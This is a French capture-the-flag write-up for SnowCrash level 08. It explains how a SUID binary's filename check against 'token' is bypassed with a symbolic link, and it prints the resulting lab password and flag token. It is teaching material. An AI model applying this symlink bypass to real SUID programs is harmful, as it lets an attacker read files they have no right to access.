# Niveau 08 : Contournement des vérifications de nom de fichier

## Analyse de la vulnérabilité

En se connectant en tant que `level08`, nous avons trouvé les fichiers suivants dans le répertoire personnel :

```console
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

Cela a montré :

- Un binaire exécutable `level08` avec le bit SUID activé (appartenant à `flag08`).
- Un fichier nommé `token` avec des permissions strictes (lisible uniquement par `flag08`).

## Analyse du Binaire

En utilisant Ghidra pour décompiler le binaire `level08`, l'extrait de code C suivant révèle que le programme tente d'empêcher l'accès aux fichiers contenant "token" dans leur nom en utilisant `strstr`.

```c
  // Vérifie si le nom de fichier contient "token"
  pcVar1 = strstr(argv[1], "token");
  if (pcVar1 != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(1);
    }
  // Ouvre le fichier (étape vulnérable)
  fd = open(argv[1], O_RDONLY);
  // ... lit et affiche le contenu du fichier ...
```

Le binaire a le bit SUID activé, ce qui signifie qu'il s'exécute avec les privilèges de son propriétaire (`flag08`), ce qui lui permet de lire des fichiers auxquels l'utilisateur actuel (`level08`) ne peut pas accéder directement.

## La Vulnérabilité

La vulnérabilité réside dans la vérification naïve de la chaîne de caractères : le programme vérifie seulement si la chaîne "token" apparaît dans l'argument du nom de fichier, et non si le fichier auquel on accède est réellement le fichier `token`.

C'est un problème de sécurité classique où la validation du chemin est effectuée sur la chaîne du nom de fichier plutôt que sur l'identité réelle du fichier (inode).

## Exploitation

Nous pouvons contourner cette vérification en créant un lien symbolique vers le fichier `token` avec un nom qui ne contient pas la chaîne "token" :

```console
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/nekot
level08@SnowCrash:~$ ./level08 /tmp/nekot
quif5eloekouj29ke0vouxean
```

- `ln` : Crée des liens entre les fichiers.
- `-s` : Crée un lien symbolique (symlink) au lieu d'un lien physique. Un lien symbolique est comme un raccourci qui pointe vers un autre fichier.

## Pourquoi cela fonctionne

1. Le lien symbolique `/tmp/nekot` pointe vers le fichier `token` réel.
2. Lorsque `level08` vérifie le nom de fichier, il voit "nekot" qui ne contient pas "token".
3. La vérification passe, et le programme procède à l'ouverture du fichier.
4. À cause du bit SUID, le programme ouvre le fichier avec les privilèges de `flag08`.
5. Après avoir ouvert le fichier, le programme lit et affiche son contenu.

C'est un exemple classique de la différence entre la validation du nom d'une ressource et la validation de la ressource elle-même, un piège de sécurité courant.

## Jeton

Après avoir lu le fichier `token`, nous avons obtenu : `quif5eloekouj29ke0vouxean`

C'est le mot de passe pour l'utilisateur `flag08`, pas le jeton réel pour le niveau. Pour obtenir le jeton :

```console
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

Le jeton réel pour le niveau 08 est : `25749xKZ8L7DkSCwJkT9dyv6f`

Ce jeton permet d'accéder au compte utilisateur `level09`.

## Leçon de Sécurité

Ce niveau démontre plusieurs concepts de sécurité importants :

1. Vulnérabilités de traversée de répertoire (Path traversal).
2. L'importance d'une validation correcte des fichiers.
3. Comment les liens symboliques peuvent être utilisés pour contourner des vérifications de sécurité naïves.
4. Les risques associés aux binaires SUID combinés à une validation d'entrée inadéquate.
